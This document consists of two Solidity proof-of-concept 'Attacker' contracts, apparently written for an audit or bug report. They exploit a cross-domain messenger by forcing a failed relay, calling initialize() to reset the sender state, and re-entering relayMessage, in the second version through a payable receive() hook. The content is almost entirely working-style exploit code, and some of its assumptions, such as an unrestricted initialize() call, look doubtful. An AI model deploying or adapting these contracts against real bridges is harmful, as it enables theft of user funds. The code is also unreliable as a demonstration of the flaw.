POC 1 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableCrossDomainMessenger.sol";
import "./ExploitableContract.sol";

contract Attacker {
    CrossDomainMessenger public messenger;
    ExploitableContract public exploitable;

    constructor(CrossDomainMessenger _messenger, ExploitableContract _exploitable) {
        messenger = _messenger;
        exploitable = _exploitable;
    }

    function attack(bytes memory data, bytes32 versionedHash) external {
        // Step 1: Cause an initial failure to mark the message as failed
        messenger.relayMessage(address(exploitable), data, 100000, versionedHash);

        // Step 2: Simulate an upgrade by resetting xDomainMsgSender
        messenger.initialize();

        // Step 3: Reenter the relayMessage call during retry
        messenger.relayMessage(address(exploitable), data, 100000, versionedHash);
    }
}

POC 2
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableCrossDomainMessenger.sol";
import "./ExploitableContract.sol";

contract Attacker {
    VulnerableCrossDomainMessenger public messenger;
    ExploitableContract public exploitable;

    constructor(VulnerableCrossDomainMessenger _messenger, ExploitableContract _exploitable) {
        messenger = _messenger;
        exploitable = _exploitable;
    }

    function attack(bytes memory data, bytes32 versionedHash) external payable {
        // Step 1: Trigger a failed message to mark it as failed
        try messenger.relayMessage(address(exploitable), data, 100000, versionedHash) {
            revert("Initial message should fail");
        } catch {}

        // Step 2: Simulate an upgrade resetting xDomainMsgSender
        messenger.initialize();

        // Step 3: Reenter `relayMessage` during retry
        messenger.relayMessage{value: msg.value}(address(exploitable), data, 100000, versionedHash);
    }

    receive() external payable {
        // During the reentrant call, exploit the inconsistent state
        messenger.relayMessage{value: msg.value}(address(exploitable), "", 100000, keccak256("reentrant_call"));
    }
}

